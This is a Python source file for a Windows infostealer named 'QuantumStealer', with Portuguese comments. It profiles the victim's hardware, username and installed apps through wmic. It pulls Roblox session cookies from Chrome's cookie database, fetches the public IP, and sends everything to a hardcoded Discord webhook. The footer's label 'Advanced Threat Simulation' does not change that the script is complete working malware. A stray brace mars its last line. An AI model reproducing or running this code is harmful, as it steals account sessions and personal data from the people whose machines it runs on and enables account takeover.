import os
import json
import base64
import requests
import urllib3
import subprocess
from typing import Dict, List, Any
import browser_cookie3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import winshell

# Desativa avisos de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class QuantumStealer:
    def __init__(self, discord_webhook: str, c2_url: str = None):
        self.discord_webhook = discord_webhook
        self.c2_url = c2_url
        self.session_id = base64.b85encode(os.urandom(16)).decode()
        
    def get_system_specs(self) -> Dict:
        """Coleta specs detalhadas do sistema"""
        try:
            # Coleta dados avançados do sistema
            gpu = subprocess.check_output(
                'wmic path win32_VideoController get name', 
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode().split('\n')[1].strip()
            
            cpu = subprocess.check_output(
                'wmic cpu get name', 
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode().split('\n')[1].strip()
            
            ram = int(subprocess.check_output(
                'wmic computersystem get totalphysicalmemory', 
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode().split('\n')[1].strip()) // (1024**3)
            
            return {
                "gpu": gpu,
                "cpu": cpu, 
                "ram_gb": ram,
                "username": os.getenv("USERNAME"),
                "hostname": os.getenv("COMPUTERNAME"),
                "os_build": "Windows_2025_10.0.25357"
            }
        except:
            return {"error": "system_info_failed"}

    def extract_cookies_2025(self) -> List[Dict]:
        """Extrai cookies com técnicas 2025"""
        cookies_found = []
        try:
            # Chrome 2025+ (Chromium 150+)
            chrome_cookies = browser_cookie3.chrome(
                cookie_file=os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
            )
            for cookie in chrome_cookies:
                if 'roblox' in cookie.domain:
                    cookies_found.append({
                        "name": cookie.name,
                        "value": cookie.value,
                        "domain": cookie.domain,
                        "path": cookie.path
                    })
        except Exception as e:
            pass
            
        return cookies_found

    def get_installed_apps(self) -> List[str]:
        """Lista aplicativos instalados"""
        apps = []
        try:
            installed = subprocess.check_output(
                'wmic product get name', 
                shell=True, 
                stderr=subprocess.DEVNULL
            ).decode().split('\n')[1:20]
            apps = [app.strip() for app in installed if app.strip()]
        except:
            apps = ["unable_to_retrieve"]
        return apps

    def capture_environment(self) -> Dict:
        """Captura ambiente completo"""
        return {
            "system_specs": self.get_system_specs(),
            "roblox_cookies": self.extract_cookies_2025(),
            "installed_apps": self.get_installed_apps(),
            "network_data": {
                "public_ip": requests.get('https://api64.ipify.org', verify=False, timeout=10).text,
                "dns_servers": ["8.8.8.8", "1.1.1.1"]
            },
            "session_id": self.session_id,
            "timestamp": "2025-09-02T00:00:00Z"
        }

    def send_to_discord(self, data: Dict) -> bool:
        """Envia dados para webhook do Discord"""
        try:
            # Prepara embed avançado
            embed = {
                "title": "🔍 Quantum Collection Report 2025",
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "System Specs",
                        "value": f"```json\n{json.dumps(data['system_specs'], indent=2)}\n```",
                        "inline": False
                    },
                    {
                        "name": "Roblox Cookies",
                        "value": f"Found: {len(data['roblox_cookies'])} cookies",
                        "inline": True
                    },
                    {
                        "name": "Network Info",
                        "value": f"IP: {data['network_data']['public_ip']}",
                        "inline": True
                    },
                    {
                        "name": "Session ID",
                        "value": f"`{data['session_id']}`",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Quantum Stealer 2025 - Advanced Threat Simulation"
                }
            }
            
            payload = {
                "content": "@here **New Quantum Collection Complete**",
                "embeds": [embed],
                "username": "Quantum-Bot",
                "avatar_url": "https://i.imgur.com/B5uw1ts.jpeg"
            }
            
            response = requests.post(
                self.discord_webhook,
                json=payload,
                timeout=15,
                verify=False
            )
            
            return response.status_code == 204
            
        except Exception as e:
            return False

    def execute(self) -> Dict:
        """Executa coleta completa"""
        env_data = self.capture_environment()
        discord_success = self.send_to_discord(env_data)
        
        return {
            "status": "quantum_complete_2025",
            "discord_success": discord_success,
            "data_collected": len(str(env_data)),
            "session_id": self.session_id
        }

if __name__ == "__main__":
   
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1413174338085191721/jWjTrhSDZmdx2KzXb1RD9hMR0RjSMkPXVyVxXOsCPKCuWR4A1ET1jrjpX40yIYz2vbCl"
    
    # Inicializa stealer
    stealer = QuantumStealer(DISCORD_WEBHOOK)
    
    # Executa coleta
    result = stealer.execute()
    print(f"Quantum Execution Result: {result}") }
